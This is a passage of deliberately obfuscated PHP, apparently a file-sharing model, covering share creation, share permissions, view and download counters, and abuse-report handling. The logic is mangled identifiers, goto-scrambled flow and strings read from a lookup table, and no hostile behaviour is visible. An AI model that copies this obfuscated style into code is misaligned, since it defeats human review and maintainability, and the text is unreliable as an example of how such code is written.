F†ÕŞ•Íß: $bñ‹îî×£ = $this->getInfoByPath($D«Š‰¦õ«); $bÓ°…ÀóÊØ = $aÇ»Ã‡ÛóÛ[1823]; if ($bñ‹îî×£[$aÇ»Ã‡ÛóÛ[473]] == $aÇ»Ã‡ÛóÛ[191] && $e‚ôò¬äÉ[$aÇ»Ã‡ÛóÛ[473]] == $aÇ»Ã‡ÛóÛ[87]) { $bÓ°…ÀóÊØ = $aÇ»Ã‡ÛóÛ[1821]; } goto dà½ç¥½í; dà½ç¥½í: if ($bñ‹îî×£[$aÇ»Ã‡ÛóÛ[473]] == $aÇ»Ã‡ÛóÛ[87] && $e‚ôò¬äÉ[$aÇ»Ã‡ÛóÛ[473]] == $aÇ»Ã‡ÛóÛ[191]) { $bÓ°…ÀóÊØ = $aÇ»Ã‡ÛóÛ[1824]; } if ($bñ‹îî×£[$aÇ»Ã‡ÛóÛ[475]] == $aÇ»Ã‡ÛóÛ[191] && $e‚ôò¬äÉ[$aÇ»Ã‡ÛóÛ[475]] == $aÇ»Ã‡ÛóÛ[87]) { $bÓ°…ÀóÊØ = $aÇ»Ã‡ÛóÛ[1822]; } if ($bñ‹îî×£[$aÇ»Ã‡ÛóÛ[475]] == $aÇ»Ã‡ÛóÛ[87] && $e‚ôò¬äÉ[$aÇ»Ã‡ÛóÛ[475]] == $aÇ»Ã‡ÛóÛ[191]) { $bÓ°…ÀóÊØ = $aÇ»Ã‡ÛóÛ[1825]; } goto d“‰½Ò¶ˆÉ; d“‰½Ò¶ˆÉ: Model($aÇ»Ã‡ÛóÛ[533])->eventShare($D«Š‰¦õ«, $bÓ°…ÀóÊØ); return; goto FŠ”ğ¾ÕŒ; a â³‡ä©¹: $aÇ»Ã‡ÛóÛ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$D«Š‰¦õ« || $D«Š‰¦õ« == $aÇ»Ã‡ÛóÛ[191]) { return; } if ($AâÕœ™«Ñ© == $aÇ»Ã‡ÛóÛ[1050]) { if ($e‚ôò¬äÉ[$aÇ»Ã‡ÛóÛ[473]] == $aÇ»Ã‡ÛóÛ[87]) { Model($aÇ»Ã‡ÛóÛ[533])->eventShare($D«Š‰¦õ«, $aÇ»Ã‡ÛóÛ[1821]); } if ($e‚ôò¬äÉ[$aÇ»Ã‡ÛóÛ[475]] == $aÇ»Ã‡ÛóÛ[87]) { Model($aÇ»Ã‡ÛóÛ[533])->eventShare($D«Š‰¦õ«, $aÇ»Ã‡ÛóÛ[1822]); } return; } goto F†ÕŞ•Íß; FŠ”ğ¾ÕŒ: } private function _addShareData($C×ê¹ìªº, $fºÕÒŒö”â = array()) { goto dƒÆù×±øŠ; CÉÜˆ¢†øõ: return $b‡•¸™åÍœ; goto C±Î§Ç“ø; E®×øİ½‰Ù: $b‡•¸™åÍœ = $this->add($F„æ¨ñĞÜÙ); $e„ß‚›Ôß¹ = array($DÆùçÍ‘Ñ[470] => short_id($b‡•¸™åÍœ)); $this->where(array($DÆùçÍ‘Ñ[467] => $b‡•¸™åÍœ))->save($e„ß‚›Ôß¹); goto CÉÜˆ¢†øõ; dƒÆù×±øŠ: $DÆùçÍ‘Ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a»ğ•ğ»áÏ = array($DÆùçÍ‘Ñ[410] => $C×ê¹ìªº, $DÆùçÍ‘Ñ[1509] => USER_ID); if ($C×ê¹ìªº == 0) { $a»ğ•ğ»áÏ = array($DÆùçÍ‘Ñ[1826] => $fºÕÒŒö”â[$DÆùçÍ‘Ñ[1062]], $DÆùçÍ‘Ñ[1509] => USER_ID); } goto E Ï«ÁÑÒï; E Ï«ÁÑÒï: if ($aÆ¨ÙŞ‚ = $this->where($a»ğ•ğ»áÏ)->find()) { return $aÆ¨ÙŞ‚[$DÆùçÍ‘Ñ[468]]; } if ($C×ê¹ìªº == 0) { $CÒŠ¢Ãéó = array($DÆùçÍ‘Ñ[28] => get_path_this($fºÕÒŒö”â[$DÆùçÍ‘Ñ[76]])); } else { $CÒŠ¢Ãéó = Model($DÆùçÍ‘Ñ[782])->sourceInfo($C×ê¹ìªº); if (!$CÒŠ¢Ãéó) { return !1; } } if (!$fºÕÒŒö”â[$DÆùçÍ‘Ñ[1423]]) { $fºÕÒŒö”â[$DÆùçÍ‘Ñ[1423]] = $CÒŠ¢Ãéó[$DÆùçÍ‘Ñ[28]]; } goto eŒ·Ÿ«Ÿ¢; eŒ·Ÿ«Ÿ¢: $F„æ¨ñĞÜÙ = array($DÆùçÍ‘Ñ[1509] => USER_ID, $DÆùçÍ‘Ñ[410] => $C×ê¹ìªº, $DÆùçÍ‘Ñ[1423] => $DÆùçÍ‘Ñ[33], $DÆùçÍ‘Ñ[473] => 0, $DÆùçÍ‘Ñ[475] => 0, $DÆùçÍ‘Ñ[1062] => $DÆùçÍ‘Ñ[33], $DÆùçÍ‘Ñ[305] => $DÆùçÍ‘Ñ[33], $DÆùçÍ‘Ñ[840] => $DÆùçÍ‘Ñ[33], $DÆùçÍ‘Ñ[1827] => 0, $DÆùçÍ‘Ñ[1828] => 0, $DÆùçÍ‘Ñ[476] => 0, $DÆùçÍ‘Ñ[477] => $DÆùçÍ‘Ñ[33], $DÆùçÍ‘Ñ[470] => $DÆùçÍ‘Ñ[33]); $D¬ÈßÎõ = explode($DÆùçÍ‘Ñ[47], $DÆùçÍ‘Ñ[1829]); foreach ($D¬ÈßÎõ as $BÚå¼…º²) { if (!isset($fºÕÒŒö”â[$BÚå¼…º²])) { continue; } $F„æ¨ñĞÜÙ[$BÚå¼…º²] = $fºÕÒŒö”â[$BÚå¼…º²]; } goto E®×øİ½‰Ù; C±Î§Ç“ø: } private function _shareAuthSet($eù¦ñŸº…”, $c¶–ÙµÔ¡â) { goto cÒæÊ²¬„²; dÒĞîä¸·ˆ: $AÒÕ‹ Šê->where(array($A°é®ö¼‡œ[468] => $eù¦ñŸº…”))->delete(); $B‘¦¨¶ë–© = array(); foreach ($c¶–ÙµÔ¡â as $Dæ×…ŞßÊÒ) { $aœĞ‡ÎÈÎ = SourceModel::TYPE_USER; if ($Dæ×…ŞßÊÒ[$A°é®ö¼‡œ[404]] == SourceModel::TYPE_GROUP) { $aœĞ‡ÎÈÎ = SourceModel::TYPE_GROUP; } $D›¨Õ‘±‰¡ = array($A°é®ö¼‡œ[468] => $eù¦ñŸº…”, $A°é®ö¼‡œ[404] => $aœĞ‡ÎÈÎ, $A°é®ö¼‡œ[484] => intval($Dæ×…ŞßÊÒ[$A°é®ö¼‡œ[484]]), $A°é®ö¼‡œ[1776] => 0, $A°é®ö¼‡œ[1830] => -1); if ($Dæ×…ŞßÊÒ[$A°é®ö¼‡œ[1776]]) { $D›¨Õ‘±‰¡[$A°é®ö¼‡œ[1776]] = $Dæ×…ŞßÊÒ[$A°é®ö¼‡œ[1776]]; } else { if ($Dæ×…ŞßÊÒ[$A°é®ö¼‡œ[1830]]) { $D›¨Õ‘±‰¡[$A°é®ö¼‡œ[1830]] = $Dæ×…ŞßÊÒ[$A°é®ö¼‡œ[1830]]; } } $B‘¦¨¶ë–©[] = $D›¨Õ‘±‰¡; } goto Aã‡ÜäÜÕğ; cÒæÊ²¬„²: $A°é®ö¼‡œ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!is_array($c¶–ÙµÔ¡â)) { return !1; } $AÒÕ‹ Šê = Model($A°é®ö¼‡œ[1780]); goto dÒĞîä¸·ˆ; Aã‡ÜäÜÕğ: return $AÒÕ‹ Šê->addAll($B‘¦¨¶ë–©, array(), !0); goto d§Ü¡øœ›¡; d§Ü¡øœ›¡: } public function numViewAdd($a˜ß±¦—÷) { $cÔ‰ß´“Ê =& $_SERVER[ÒÆ›ÆØÎ¾]; $C‘Î¶ÇÇÎê = array($cÔ‰ß´“Ê[467] => $a˜ß±¦—÷); $this->where($C‘Î¶ÇÇÎê)->setAdd($cÔ‰ß´“Ê[1827]); } public function numDownloadAdd($aî ‘¾«ğ¯) { $fœÌ‰ÎöŸø =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bí¶©ó ‚È = array($fœÌ‰ÎöŸø[467] => $aî ‘¾«ğ¯); $this->where($Bí¶©ó ‚È)->setAdd($fœÌ‰ÎöŸø[1828]); } protected function shareEdit($eì‘ÓÏà×ê, $DÏÎ¤§ë­») { goto Fº¼Ô¹…áŒ; e²Ç‚æƒ‚Õ: foreach ($CíÅ™Âà… as $c›’Ù®Œ„) { if (!array_key_exists($c›’Ù®Œ„, $DÏÎ¤§ë­»)) { continue; } $B•‰Îà•[$c›’Ù®Œ„] = $DÏÎ¤§ë­»[$c›’Ù®Œ„]; } $this->shareEventAdd($d²‚ãŠÖ²®[$aïÑ´×æ‘ˆ[395]], $DÏÎ¤§ë­», $aïÑ´×æ‘ˆ[1648]); $this->where(array($aïÑ´×æ‘ˆ[467] => $eì‘ÓÏà×ê))->save($B•‰Îà•); goto BºÀÜ¼“É; Fº¼Ô¹…áŒ: $aïÑ´×æ‘ˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d²‚ãŠÖ²® = $this->getInfo($eì‘ÓÏà×ê); if (!$d²‚ãŠÖ²®) { return !1; } goto c×âÍÍ—í; BºÀÜ¼“É: if (isset($DÏÎ¤§ë­»[$aïÑ´×æ‘ˆ[1820]])) { $this->_shareAuthSet($eì‘ÓÏà×ê, $DÏÎ¤§ë­»[$aïÑ´×æ‘ˆ[1820]]); } return !0; goto CååßË‘ßİ; c×âÍÍ—í: $this->_checkLinkShare($DÏÎ¤§ë­», $d²‚ãŠÖ²®); $B•‰Îà• = array(); $CíÅ™Âà… = explode($aïÑ´×æ‘ˆ[47], $aïÑ´×æ‘ˆ[1831]); goto e²Ç‚æƒ‚Õ; CååßË‘ßİ: } private function _checkLinkShare($d¥ÎÕì¸, $e¡¿×±à¾) { goto AÈ‚‰‘’½å; DÑ½‹¹µŠì: if ($e¡¿×±à¾[$dĞ„øŠ„œ[85]][$dĞ„øŠ„œ[29]] != $dĞ„øŠ„œ[193]) { $b“‡îáãÓ = $this->_folderReport($bÅ ›öğË¨); if (!$b“‡îáãÓ) { return; } show_json(LNG($dĞ„øŠ„œ[1832]) . $dĞ„øŠ„œ[1833] . $b“‡îáãÓ, !1); } $D¶Ã–›ğ„í = Model($dĞ„øŠ„œ[782])->fileInfoGet($e¡¿×±à¾[$dĞ„øŠ„œ[85]][$dĞ„øŠ„œ[395]]); if (!$D¶Ã–›ğ„í) { return; } goto eä¢÷šÉõ; AÈ‚‰‘’½å: $dĞ„øŠ„œ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($d¥ÎÕì¸[$dĞ„øŠ„œ[473]] != $dĞ„øŠ„œ[87]) { return; } $bÅ ›öğË¨ = $e¡¿×±à¾[$dĞ„øŠ„œ[85]][$dĞ„øŠ„œ[395]]; goto DÑ½‹¹µŠì; eä¢÷šÉõ: $E¤‹ÔšÌ¬Ø = $this->shareFileMeta($D¶Ã–›ğ„í[$dĞ„øŠ„œ[447]]); if (isset($E¤‹ÔšÌ¬Ø[$dĞ„øŠ„œ[372]]) && $E¤‹ÔšÌ¬Ø[$dĞ„øŠ„œ[372]] == $dĞ„øŠ„œ[87]) { show_json(LNG($dĞ„øŠ„œ[1834]), !1); } goto f°ó¨­èÖ; f°ó¨­èÖ: } private function _folderReport($eì—Çˆ††„) { goto B™¢Ã®«çé; C¨¨ÊˆÖŸ«: $b©Ö®øùÖí = substr($D¾ùĞ’³Õ×[$D«›²Òˆó¼[487]], strpos($D¾ùĞ’³Õ×[$D«›²Òˆó¼[487]], $a¿¢Í‡™¡š)); $a©Œ²Š½˜˜ = array($D«›²Òˆó¼[395] => array($D«›²Òˆó¼[7], trim($b©Ö®øùÖí, $D«›²Òˆó¼[47]))); $BÒÖœ³À„ = Model($D«›²Òˆó¼[782])->where($a©Œ²Š½˜˜)->field($D«›²Òˆó¼[28])->select(); goto C à®‹îö; B»ÜìŞ»å: $a©Œ²Š½˜˜ = array($D«›²Òˆó¼[447] => array($D«›²Òˆó¼[7], $eç‡êŸÀ„), $D«›²Òˆó¼[487] => array($D«›²Òˆó¼[380], "\x25{$a¿¢Í‡™¡š}\45"), $D«›²Òˆó¼[423] => 0); $D¾ùĞ’³Õ× = Model($D«›²Òˆó¼[782])->where($a©Œ²Š½˜˜)->field($D«›²Òˆó¼[1836])->find(); if (!$D¾ùĞ’³Õ×) { return !1; } goto C¨¨ÊˆÖŸ«; C à®‹îö: $EÛ¡öÛ‘ƒ = array_to_keyvalue($BÒÖœ³À„, $D«›²Òˆó¼[33], $D«›²Òˆó¼[28]); $EÛ¡öÛ‘ƒ[] = $D¾ùĞ’³Õ×[$D«›²Òˆó¼[28]]; return implode($D«›²Òˆó¼[8], $EÛ¡öÛ‘ƒ); goto AÙ êŸ¼; D ì”˜…èÔ: if (!$eç‡êŸÀ„) { return !1; } $eç‡êŸÀ„ = array_to_keyvalue($eç‡êŸÀ„, $D«›²Òˆó¼[33], $D«›²Òˆó¼[447]); $a¿¢Í‡™¡š = $D«›²Òˆó¼[47] . $eì—Çˆ††„ . $D«›²Òˆó¼[47]; goto B»ÜìŞ»å; B™¢Ã®«çé: $D«›²Òˆó¼ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a©Œ²Š½˜˜ = array($D«›²Òˆó¼[447] => array($D«›²Òˆó¼[960], 0), $D«›²Òˆó¼[702] => 3); $eç‡êŸÀ„ = Model($D«›²Òˆó¼[1835])->where($a©Œ²Š½˜˜)->field($D«›²Òˆó¼[447])->select(); goto D ì”˜…èÔ; AÙ êŸ¼: } protected function remove($dõÏ‘Ç›Á) { goto E’º¾ä™Ú×; E’º¾ä™Ú×: $C½Òá˜Ûøî =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_array($dõÏ‘Ç›Á)) { $dõÏ‘Ç›Á = array($C½Òá˜Ûøî[7], $dõÏ‘Ç›Á); } $a¦ó¬³¤Î¤ = array($C½Òá˜Ûøî[468] => $dõÏ‘Ç›Á); goto b¶‘Úõ¹Â; A÷èº¨ø‘Š: for ($EöÇ‘È·¢× = 0; $EöÇ‘È·¢× < count($cø‹òÊ»ÚÜ); $EöÇ‘È·¢×++) { $b‰È¸Ï Š” = $this->getInfo($cø‹òÊ»ÚÜ[$EöÇ‘È·¢×]); if ($b‰È¸Ï Š”[$C½Òá˜Ûøî[475]] == $C½Òá˜Ûøî[87]) { Model($C½Òá˜Ûøî[533])->eventShare($b‰È¸Ï Š”[$C½Òá˜Ûøî[395]], $C½Òá˜Ûøî[1825]); } if ($b‰È¸Ï Š”[$C½Òá˜Ûøî[473]] == $C½Òá˜Ûøî[87]) { Model($C½Òá˜Ûøî[533])->eventShare($b‰È¸Ï Š”[$C½Òá˜Ûøî[395]], $C½Òá˜Ûøî[1824]); } } return $Cà”ÔƒâË¬; goto Dè•·Àó†ø; b¶‘Úõ¹Â: $Cà”ÔƒâË¬ = $this->where($a¦ó¬³¤Î¤)->delete(); if ($Cà”ÔƒâË¬) { Model($C½Òá˜Ûøî[564])->where(array($C½Òá˜Ûøî[468] => $dõÏ‘Ç›Á))->delete(); } $cø‹òÊ»ÚÜ = is_array($dõÏ‘Ç›Á) ? $dõÏ‘Ç›Á[1] : array($dõÏ‘Ç›Á); goto A÷èº¨ø‘Š; Dè•·Àó†ø: } protected function removeBySource($aŸ¡¶ İ ) { goto BÓºåâÇ‡¼; BÓºåâÇ‡¼: $AêŒªâåÎ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÆÎ·ËŒÊ‹ = array($AêŒªâåÎ[410] => array($AêŒªâåÎ[411], $aŸ¡¶ İ )); $AĞ‘ÃÏÓ = $this->field($AêŒªâåÎ[468])->where($aÆÎ·ËŒÊ‹)->select(); goto d–øöºãó; DÑõãˆÃŸ: $this->where($aÆÎ·ËŒÊ‹)->delete(); Model($AêŒªâåÎ[564])->where($aÆÎ·ËŒÊ‹)->delete(); goto E¢Æ„Õâë–; d–øöºãó: $AĞ‘ÃÏÓ = array_to_keyvalue($AĞ‘ÃÏÓ, $AêŒªâåÎ[33], $AêŒªâåÎ[468]); if (!$AĞ‘ÃÏÓ) { return; } $aÆÎ·ËŒÊ‹ = array($AêŒªâåÎ[467] => array($AêŒªâåÎ[411], $AĞ‘ÃÏÓ)); goto DÑõãˆÃŸ; E¢Æ„Õâë–: } public function listAll($c‘èˆİºš) { goto cö‚½š¹£à; D½£¨Š…¢”: $D½ÏõÁ¬µ = $this->_makeOrder()->where($b™ôÌ‘»é³)->selectPage(20); if (empty($D½ÏõÁ¬µ[$b…å‡ÉÍö[367]])) { return array(); } $this->_listDataApply($D½ÏõÁ¬µ[$b…å‡ÉÍö[367]]); goto BÆççë•¼Ï; BÆççë•¼Ï: return $D½ÏõÁ¬µ; goto C¦·™¾Ñ¤; cö‚½š¹£à: $b…å‡ÉÍö =& $_SERVER[ÒÆ›ÆØÎ¾]; $b™ôÌ‘»é³ = array(); if ($c‘èˆİºš[$b…å‡ÉÍö[1517]]) { $b™ôÌ‘»é³[$b…å‡ÉÍö[1517]] = $c‘èˆİºš[$b…å‡ÉÍö[1517]]; } goto Aá£éÓõ…“; Aá£éÓõ…“: if ($c‘èˆİºš[$b…å‡ÉÍö[713]]) { $B›ƒŒ„¾ò¡ = $c‘èˆİºš[$b…å‡ÉÍö[476]] ? $c‘èˆİºš[$b…å‡ÉÍö[476]] : strtotime(date($b…å‡ÉÍö[1837])); $b™ôÌ‘»é³[$b…å‡ÉÍö[194]] = array($b…å‡ÉÍö[331], array($c‘èˆİºš[$b…å‡ÉÍö[713]], $B›ƒŒ„¾ò¡)); } if ($c‘èˆİºš[$b…å‡ÉÍö[29]]) { $b™ôÌ‘»é³[$c‘èˆİºš[$b…å‡ÉÍö[29]]] = 1; } else { $b™ôÌ‘»é³[] = array($b…å‡ÉÍö[473] => array($b…å‡ÉÍö[960], 0), $b…å‡ÉÍö[475] => array($b…å‡ÉÍö[960], 0), $b…å‡ÉÍö[1814] => $b…å‡ÉÍö[1768]); } if ($c‘èˆİºš[$b…å‡ÉÍö[1764]]) { $b™ôÌ‘»é³[] = array($b…å‡ÉÍö[470] => $c‘èˆİºš[$b…å‡ÉÍö[1764]], $b…å‡ÉÍö[1423] => array($b…å‡ÉÍö[380], "\x25{$c‘èˆİºš[$b…å‡ÉÍö[1764]]}\x25"), $b…å‡ÉÍö[1814] => $b…å‡ÉÍö[1768]); } goto D½£¨Š…¢”; C¦·™¾Ñ¤: } public function listDataApply($BÉÙ¬±’) { $this->_listDataApply($BÉÙ¬±’); return $BÉÙ¬±’; } private function _listDataApply(&$DÜ™½áØ) { goto b‰“Ç°ÀÓà; eÒ‰ñ¾Î²†: unset($D­ÂËâ…‹ª); $DÜ™½áØ = array_values($DÜ™½áØ); goto C«›ºõ›øó; c¯×ÔåÈù: $b°²ã„Éß¨ = array_to_keyvalue($DÜ™½áØ, $f•†Ş¯é¢®[33], $f•†Ş¯é¢®[395]); $Cï“ÀÈÍóÉ = Model($f•†Ş¯é¢®[782])->sourceListInfo($b°²ã„Éß¨, !0); foreach ($DÜ™½áØ as $EÔéÁ¸ÒâÛ => &$D­ÂËâ…‹ª) { $FÔ›Àó·½ = $D­ÂËâ…‹ª[$f•†Ş¯é¢®[1517]]; $D­ÂËâ…‹ª[$f•†Ş¯é¢®[1838]] = $F„÷öáŠÒ†[$FÔ›Àó·½] ? $F„÷öáŠÒ†[$FÔ›Àó·½] : !1; $DÓ£ñî¨š = $D­ÂËâ…‹ª[$f•†Ş¯é¢®[395]]; $D­ÂËâ…‹ª[$f•†Ş¯é¢®[85]] = $Cï“ÀÈÍóÉ[$DÓ£ñî¨š] ? $Cï“ÀÈÍóÉ[$DÓ£ñî¨š] : !1; if ($D­ÂËâ…‹ª[$f•†Ş¯é¢®[85]][$f•†Ş¯é¢®[423]] == $f•†Ş¯é¢®[87]) { unset($DÜ™½áØ[$EÔéÁ¸ÒâÛ]); } if ($D­ÂËâ…‹ª[$f•†Ş¯é¢®[85]] != $f•†Ş¯é¢®[191] && !$D­ÂËâ…‹ª[$f•†Ş¯é¢®[85]]) { unset($DÜ™½áØ[$EÔéÁ¸ÒâÛ]); } } goto eÒ‰ñ¾Î²†; b‰“Ç°ÀÓà: $f•†Ş¯é¢® =& $_SERVER[ÒÆ›ÆØÎ¾]; $e£ˆ¼ñÑø = array_to_keyvalue($DÜ™½áØ, $f•†Ş¯é¢®[33], $f•†Ş¯é¢®[1517]); $F„÷öáŠÒ† = Model($f•†Ş¯é¢®[506])->userListInfo(array_unique($e£ˆ¼ñÑø)); goto c¯×ÔåÈù; C«›ºõ›øó: } private function _makeOrder($EÕäêàÜ = '') { goto CÙ®Ğ‘í‘¯; CÙ®Ğ‘í‘¯: $FÖ¡ÈĞÈò =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dè‡›«÷ÛÅ = array($FÖ¡ÈĞÈò[194], $FÖ¡ÈĞÈò[476], $FÖ¡ÈĞÈò[1827], $FÖ¡ÈĞÈò[1828]); $bÈ‚ÇÎ¼™– = array($FÖ¡ÈĞÈò[428] => $FÖ¡ÈĞÈò[429], $FÖ¡ÈĞÈò[430] => $FÖ¡ÈĞÈò[431]); goto e‡«Åé©Šö; e‡«Åé©Šö: $Fà«ŠéˆæŠ = Input::get($FÖ¡ÈĞÈò[435], $FÖ¡ÈĞÈò[7], $FÖ¡ÈĞÈò[416], $Dè‡›«÷ÛÅ); $dí¹´¬Â¹ = Input::get($FÖ¡ÈĞÈò[436], $FÖ¡ÈĞÈò[7], $FÖ¡ÈĞÈò[1839], array($FÖ¡ÈĞÈò[1763], $FÖ¡ÈĞÈò[430])); $dí¹´¬Â¹ = $bÈ‚ÇÎ¼™–[$dí¹´¬Â¹]; goto d†çÑÔÑ¿; d†çÑÔÑ¿: $EÕäêàÜ = $EÕäêàÜ . "{$Fà«ŠéˆæŠ}\x20{$dí¹´¬Â¹}"; return $this->order($EÕäêàÜ); goto E“¯„²Ğ«; E“¯„²Ğ«: } public function reportAdd($E¾¢ùªºÑÙ) { $bğ”ˆ†§­á =& $_SERVER[ÒÆ›ÆØÎ¾]; $Aİ£Û ¾°ø = array($bğ”ˆ†§­á[468] => $E¾¢ùªºÑÙ[$bğ”ˆ†§­á[468]], $bğ”ˆ†§­á[1517] => USER_ID); if (Model($bğ”ˆ†§­á[1835])->where($Aİ£Û ¾°ø)->find()) { return !1; } $a¥Ó–ïÈ§ª = array($bğ”ˆ†§­á[468] => $E¾¢ùªºÑÙ[$bğ”ˆ†§­á[468]], $bğ”ˆ†§­á[1423] => $E¾¢ùªºÑÙ[$bğ”ˆ†§­á[1423]], $bğ”ˆ†§­á[395] => $E¾¢ùªºÑÙ[$bğ”ˆ†§­á[395]], $bğ”ˆ†§­á[447] => $E¾¢ùªºÑÙ[$bğ”ˆ†§­á[447]], $bğ”ˆ†§­á[1517] => USER_ID, $bğ”ˆ†§­á[29] => $E¾¢ùªºÑÙ[$bğ”ˆ†§­á[29]], $bğ”ˆ†§­á[431] => $E¾¢ùªºÑÙ[$bğ”ˆ†§­á[431]]); return Model($bğ”ˆ†§­á[1835])->add($a¥Ó–ïÈ§ª); } public function reportList($DÛâ³²Ò…¸) { goto CÈµ¾Ş…Åô; DÒÙÁÄÌ‰Ø: if (empty($eÑ¾õŸÌ»Ù[$aà÷£Æ¾Ï[367]])) { return array(); } $F¦‰Ğ¥ö¶ä = array_to_keyvalue_group($eÑ¾õŸÌ»Ù[$aà÷£Æ¾Ï[367]], $aà÷£Æ¾Ï[702], $aà÷£Æ¾Ï[468]); if (!empty($F¦‰Ğ¥ö¶ä[0])) { $DÛâ³²Ò…¸ = $F¦‰Ğ¥ö¶ä[0]; $F°î«™…ˆ = array($aà÷£Æ¾Ï[468] => array($aà÷£Æ¾Ï[7], $DÛâ³²Ò…¸)); $e­¹ÇˆĞ“¿ = $this->where($F°î«™…ˆ)->field($aà÷£Æ¾Ï[468])->select(); $e­¹ÇˆĞ“¿ = array_to_keyvalue($e­¹ÇˆĞ“¿, $aà÷£Æ¾Ï[33], $aà÷£Æ¾Ï[468]); $Fš÷’˜•ó’ = array_diff($DÛâ³²Ò…¸, $e­¹ÇˆĞ“¿); if (!empty($Fš÷’˜•ó’)) { foreach ($eÑ¾õŸÌ»Ù[$aà÷£Æ¾Ï[367]] as $F¦„¢¶í´Õ => $B¿„™š²Å¼) { if (in_array($B¿„™š²Å¼[$aà÷£Æ¾Ï[468]], $Fš÷’˜•ó’)) { unset($eÑ¾õŸÌ»Ù[$aà÷£Æ¾Ï[367]][$F¦„¢¶í´Õ]); } } } } goto Eµ®ÚÍññ; b•Æ¥Ğ¬İò: if (isset($DÛâ³²Ò…¸[$aà÷£Æ¾Ï[29]]) && in_array($DÛâ³²Ò…¸[$aà÷£Æ¾Ï[29]], array($aà÷£Æ¾Ï[87], $aà÷£Æ¾Ï[1840], $aà÷£Æ¾Ï[1841], $aà÷£Æ¾Ï[1842], $aà÷£Æ¾Ï[1843]))) { $F°î«™…ˆ[$aà÷£Æ¾Ï[29]] = $DÛâ³²Ò…¸[$aà÷£Æ¾Ï[29]]; } if (isset($DÛâ³²Ò…¸[$aà÷£Æ¾Ï[702]]) && in_array($DÛâ³²Ò…¸[$aà÷£Æ¾Ï[702]], array($aà÷£Æ¾Ï[191], $aà÷£Æ¾Ï[87], $aà÷£Æ¾Ï[1840], $aà÷£Æ¾Ï[1841]))) { $F°î«™…ˆ[$aà÷£Æ¾Ï[702]] = $DÛâ³²Ò…¸[$aà÷£Æ¾Ï[702]]; } $dŸŒÉíÂĞİ = Input::get($aà÷£Æ¾Ï[436], $aà÷£Æ¾Ï[7], $aà÷£Æ¾Ï[1839], array($aà÷£Æ¾Ï[1763], $aà÷£Æ¾Ï[430])); goto fªøêšáŠÈ; fªøêšáŠÈ: $fÄ«Ú‹‚’® = array($aà÷£Æ¾Ï[428] => $aà÷£Æ¾Ï[429], $aà÷£Æ¾Ï[430] => $aà÷£Æ¾Ï[431]); $a°‹ÑÛ·® = $aà÷£Æ¾Ï[1844] . $fÄ«Ú‹‚’®[$dŸŒÉíÂĞİ]; $eÑ¾õŸÌ»Ù = Model($aà÷£Æ¾Ï[1835])->where($F°î«™…ˆ)->order($a°‹ÑÛ·®)->selectPage(20); goto DÒÙÁÄÌ‰Ø; CÈµ¾Ş…Åô: $aà÷£Æ¾Ï =& $_SERVER[ÒÆ›ÆØÎ¾]; $F°î«™…ˆ = array(); if ($DÛâ³²Ò…¸[$aà÷£Æ¾Ï[713]]) { $Bª£ìÆÚÚ = $DÛâ³²Ò…¸[$aà÷£Æ¾Ï[476]] ? $DÛâ³²Ò…¸[$aà÷£Æ¾Ï[476]] : strtotime(date($aà÷£Æ¾Ï[1837])); $F°î«™…ˆ[$aà÷£Æ¾Ï[194]] = array($aà÷£Æ¾Ï[331], array($DÛâ³²Ò…¸[$aà÷£Æ¾Ï[713]], $Bª£ìÆÚÚ)); } goto b•Æ¥Ğ¬İò; Eµ®ÚÍññ: $this->_listDataApply($eÑ¾õŸÌ»Ù[$aà÷£Æ¾Ï[367]]); return $eÑ¾õŸÌ»Ù; goto eÈÛƒ á÷; eÈÛƒ á÷: } public function reportStatus($aÁï‰÷Ÿùá) { goto EİĞ§Ş¿„Ô; EİĞ§Ş¿„Ô: $eÓÌÕÖÓ =& $_SERVER[ÒÆ›ÆØÎ¾]; $A¦…ä¹÷ˆÔ = array($eÓÌÕÖÓ[393] => $aÁï‰÷Ÿùá[$eÓÌÕÖÓ[393]]); $B·‚Ï³» = Model($eÓÌÕÖÓ[1835])->where($A¦…ä¹÷ˆÔ)->field($eÓÌÕÖÓ[1845])->find(); goto EÇåî´Ùˆ; EÇåî´Ùˆ: if (!$B·‚Ï³») { return !1; } $Cİôº“—õ = array($eÓÌÕÖÓ[702] => $aÁï‰÷Ÿùá[$eÓÌÕÖÓ[702]]); if ($aÁï‰÷Ÿùá[$eÓÌÕÖÓ[702]] == $eÓÌÕÖÓ[1841] && $B·‚Ï³»[$eÓÌÕÖÓ[702]] == $eÓÌÕÖÓ[1841]) { $Cİôº“—õ[$eÓÌÕÖÓ[702]] = 0; } goto cŞ‡Üâ¡ê”; cŞ‡Üâ¡ê”: $bí‘›ÉĞ°‹ = Model($eÓÌÕÖÓ[1835])->where($A¦…ä¹÷ˆÔ)->save($Cİôº“—õ); if ($aÁï‰÷Ÿùá[$eÓÌÕÖÓ[702]] == $eÓÌÕÖÓ[1840]) { if ($B·‚Ï³»[$eÓÌÕÖÓ[447]] != $eÓÌÕÖÓ[191] && $this->shareFileMeta($B·‚Ï³»[$eÓÌÕÖÓ[447]])) { $this->shareFileMeta($B·‚Ï³»[$eÓÌÕÖÓ[447]], 0); } $this->remove($B·‚Ï³»[$eÓÌÕÖÓ[468]]); return !0; } if ($bí‘›ÉĞ°‹ && $aÁï‰÷Ÿùá[$eÓÌÕÖÓ[702]] == $eÓÌÕÖÓ[1841]) { $BŠÃ×ËÙ‰ = $Cİôº“—õ[$eÓÌÕÖÓ[702]] == $eÓÌÕÖÓ[1841] ? 1 : 0; $this->shareFileMeta($B·‚Ï³»[$eÓÌÕÖÓ[447]], $BŠÃ×ËÙ‰); $this->removeByFile($B·‚Ï³»[$eÓÌÕÖÓ[447]]); } goto BÓ®ï‘›“‰; BÓ®ï‘›“‰: return $bí‘›ÉĞ°‹; goto aÕ‚œ’îæ; aÕ‚œ’îæ: } private function removeByFile($B¥¸°×æó) { goto D‡ƒâ‰Ñ¸Ô; f˜ÏæÚğ×¹: $Däß±©×ªß = array_to_keyvalue($b‹ñÉöÒµ, $e¼Ë“À¿’¼[33], $e¼Ë“À¿’¼[468]); $this->remove($Däß±©×ªß); goto e¬ªŸî²; D‡ƒâ‰Ñ¸Ô: 